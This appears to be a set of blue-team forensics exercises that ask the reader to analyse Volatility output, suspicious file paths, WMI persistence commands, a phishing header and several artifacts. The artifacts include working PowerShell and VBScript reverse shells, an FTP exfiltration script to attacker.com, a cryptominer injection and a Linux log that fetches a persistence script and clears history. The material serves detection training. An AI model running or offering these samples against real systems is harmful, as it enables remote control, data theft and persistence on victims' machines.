## Analyze output from memory forensic tool. Can you see something suspicious?
```
vol.py -f /home/htb-student/MemoryDumps/rootkit.vmem pslist
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x823c8830 System                    4      0     58      476 ------      0     
0x8228c020 smss.exe                368      4      3       19 ------      0 2023-06-23 16:14:49 UTC+0000
0x81e95020 csrss.exe               600    368     14      544      0      0 2023-06-23 16:14:51 UTC+0000
0x81f72da0 winlogon.exe            624    368     19      514      0      0 2023-06-23 16:14:52 UTC+0000
0x81e93020 services.exe            668    624     16      277      0      0 2023-06-23 16:14:53 UTC+0000
0x822a57a8 lsass.exe               680    624     23      358      0      0 2023-06-23 16:14:53 UTC+0000
0x822b63a1 lsass.exe               932    1444     2       30      0      0 2023-06-23 16:34:33 UTC+0000
0x82069490 vmacthlp.exe            848    668      1       25      0      0 2023-06-23 16:14:53 UTC+0000
0x82146990 svchost.exe             880    668     18      202      0      0 2023-06-23 16:14:53 UTC+0000
0x8204b128 svchost.exe             992    668     11      272      0      0 2023-06-23 16:14:53 UTC+0000
0x82219850 svchost.exe            1136    668     84     1614      0      0 2023-06-23 16:14:53 UTC+0000
0x8228f020 scvhost.exe            2980    668      5       77      0      0 2023-06-24 07:31:17 UTC+0000
0x81e63ab8 svchost.exe            1220    668     15      218      0      0 2023-06-23 16:14:54 UTC+0000
0x81924888 explorer.exe           1444    624     17      524      0      0 2023-06-23 16:34:38 UTC+0000
0x81863138 cmd.exe                2980   1444      0 --------      0      0 2023-06-24 07:31:16 UTC+0000
```

## During incident investigation you found some files tell me which one looks potentialy suspicious and why?
```
Common Suspicious File Paths
Temp and AppData Directories

C:\Users\username\AppData\Local\Temp\cmd.exe
C:\Users\username\AppData\Roaming\svchost.exe
C:\Users\username\AppData\Local\Microsoft\Edge\User Data\Default\Extensions\payload.js
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\script.bat

System Directories with Unusual Files

C:\Windows\System32\drivers\etc\hosts (unexpected modifications)
C:\Windows\System32\svchost.exe (wrong location or mismatched hash)
C:\Windows\SysWOW64\calc.exe (unexpectedly replaced)
Startup and Registry Paths


C:\Users\Public\Documents\autorun.inf
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\malicious.exe
Downloads and Suspicious User Files

C:\Users\username\Downloads\invoice_1234.exe
C:\Users\username\Desktop\passwords.scr
C:\Users\username\Pictures\image.jpg.exe
Unusual or Misleading Filenames
explorer.exe (located in a non-system directory)
notepad.exe (hash mismatch)
svch0st.exe (typo-squatting legit process names)
taskmgr.exe (copy in unexpected directories)
winlogon123.exe
Indicators of Persistence or Evasion
Hidden or System Files

C:\Users\username\AppData\Local\Temp\.hidden_payload.dll
C:\Windows\System32\drivers\.driver.sys
Obfuscated Filenames

C:\Users\username\AppData\Local\Temp\O1iIl1.exe
C:\Windows\Temp\{GUID}.exe
Unexpected Locations

C:\Recycle\Desktop.ini
C:\Windows\Help\help.pdf.exe
```

## Refer to below output which process requires additional analyzes? Explain why. Is there a possibility for False positives?
```
Part 1.
Volatility Foundation Volatility 2.6
Pid      Process              Start              End                Tag              Protection
-------  ------------------   ----------------   ----------------   ---------------  -------------
1548     explorer.exe         0x0000000002000000 0x0000000002010000 VadS             PAGE_EXECUTE_READWRITE
1548     explorer.exe         0x0000000003000000 0x0000000003010000 VadS             PAGE_READWRITE
...
```
## Analyze rest of it what potentaily is going on?
```
Part 2.
Details for VAD at 0x0000000002000000:
---------------------------------------------------
Memory protection: PAGE_EXECUTE_READWRITE
Mapped file: [no name]
Executable section in a non-standard memory region!
Hex dump of first 64 bytes:

2000000  4d 5a 90 00 03 00 00 00 04 00 00 00 00 00 00 00   MZ..............
2000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
2000020  50 45 00 00 4c 01 03 00 00 00 00 00 00 00 00 00   PE..L...........
2000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................

Detected PE file header at 0x2000000 in process explorer.exe.
Possible injected code or reflective loading detected!
```

## During investigation of command line transcript you noticed below commands, can you explain what is going on?
```
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="EventFilter_MSEdgeUpdate", 
Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'cmd.exe'", 
QueryLanguage="WQL"
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="ExecuteUpdate", 
CommandLineTemplate="powershell.exe -nop -w hidden -enc JAB0AGgAIAAiACQAcgBvAGcAIAAiAHwAIAAiAGwAMgAtAGIAcgBoAGQAZAAtAG8AdgBpAGQAZgAuAGYAbQAiAHwAIAAiAGwAMgAtAGIAcgBoAGQAZAAtAG8AdgBpAGQAZgAuAGYAbQAi" 
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="\\\\.\\root\\subscription:__EventFilter.Name='EventFilter_MSEdgeUpdate'", 
Consumer="\\\\.\\root\\subscription:CommandLineEventConsumer.Name='ExecuteUpdate'"
```

## Identify language and script purpose.
```
$client = New-Object System.Net.Sockets.TCPClient("sys-internall-tools-staging.io", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
while ($true) {
    $command = $reader.ReadLine()
    $output = Invoke-Expression $command
    $writer.WriteLine($output)
    $writer.Flush()
}
```

##
```
$ftpServer = "ftp://attacker.com"
$ftpUser = "attacker"
$ftpPassword = "P@ssw0rd"
$filePath = "C:\SensitiveData\ImportantFile.txt"
$ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer/ImportantFile.txt")
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPassword)
$fileContent = [System.IO.File]::ReadAllBytes($filePath)
$ftpRequest.GetRequestStream().Write($fileContent, 0, $fileContent.Length)
$ftpRequest.GetResponse()
```

##
```
Set objSocket = CreateObject("MSWinsock.Winsock")
objSocket.RemoteHost = "ms-win32-update-live.ru"
objSocket.RemotePort = 1337
objSocket.Connect
Do Until objSocket.Connected
    WScript.Sleep 100
Loop
Do
    strCommand = objSocket.GetData
    strResult = ExecuteCommand(strCommand)
    objSocket.SendData strResult
Loop

Function ExecuteCommand(command)
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(command)
    ExecuteCommand = objExec.StdOut.ReadAll
End Function
```

##
```
var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/npm/coinhive@2.0.0/lib/coinhive.min.js";
document.body.appendChild(script);

script.onload = function() {
    var mine = new CoinHive.User("YOUR_SITE_KEY");
    mine.start();
};
```

##
```
Return-Path: <noreply@company.com>
Received: from mail.server.com (mail.server.com [192.168.1.10]) by mail.mydomain.com with ESMTP id a1b2c3d4 for <recipient@mydomain.com>; Thu, 3 Dec 2024 10:02:05 -0500 (EST)
Received-SPF: fail (mydomain.com: domain of noreply@company.com does not designate 192.168.1.10 as permitted sender) client-ip=192.168.1.10; envelope-from=noreply@company.com; helo=mail.server.com;
Authentication-Results: mydomain.com; spf=fail (sender IP is not authorized) smtp.mailfrom=noreply@company.com
From: "CEO John Doe" <john.doe@company.com>
Reply-To: <fake.email@external-malicious-domain.com>
To: <recipient@mydomain.com>
Subject: Urgent: Immediate Action Required on Your Account
Date: Thu, 3 Dec 2024 10:00:00 -0500
Message-ID: <b1c2d3f4g5h6i7j8k9l0@company.com>
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: base64
X-Spam-Flag: YES
X-Spam-Score: 8.5 (high)
X-Spam-Status: Yes, score=8.5 required=5.0 tests=ALL_TRUSTED,HTML_MESSAGE,SPF_FAIL,URI_HEURISTICS,FROM_EXCESS_BASE64,DKIM_SIGNED,HTML_FONT_SIZE_LARGE,HTML_FONT_COLOR_LARGE
X-Phishing-Alert: Potential Phishing Attempt Detected
```

##
```
schtasks /create /tn "MaliciousTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\malicious.bat" /sc once /st 00:00 /ru SYSTEM
```

##
```
Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName 


Name                DisplayName                State    StartMode   PathName
----                -----------                -----    ---------   --------
wuauserv            Windows Update             Running  Manual      C:\Windows\System32\svchost.exe -k netsvcs
w32time             Windows Time               Running  Manual      C:\Windows\System32\svchost.exe -k LocalService
Task Schedular      Windwos Task Scheduler     Running  Auto        C:\Windows\Tasks\scheduled.exe
Spooler             Print Spooler              Running  Auto        C:\Windows\System32\spoolsv.exe
MaliciousService    Malicious Service          Running  Auto        C:\Users\Public\notepad.exe
SystemUpdateService System Update Service      Running  Auto        C:\Windows\Temp\system_update.exe
UdkUserSvc_268339   Udk User Service_268339    Stopped  Manual      C:\Windows\System32\svchost.exe -k UdkSvcGroup
```

##
```
ls -alh /home/user
find / -name "config*" -exec cat {} \;
echo "10.10.10.1" >> /etc/hosts
ping -c 4 attacker.com
mkdir -p /var/tmp/new_folder
cp /bin/bash /var/tmp/new_folder/bash
chmod +x /var/tmp/new_folder/bash
/var/tmp/new_folder/bash -p
echo "attacker_password" | sudo -S usermod -aG sudo attacker
ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
wget http://attacker.com/persistence_script.sh -O /tmp/persistence_script.sh
chmod +x /tmp/persistence_script.sh
/tmp/persistence_script.sh
cat /etc/passwd | grep root
chmod 700 /home/attacker/.ssh
history -c
```
##
```
```
##
```
```
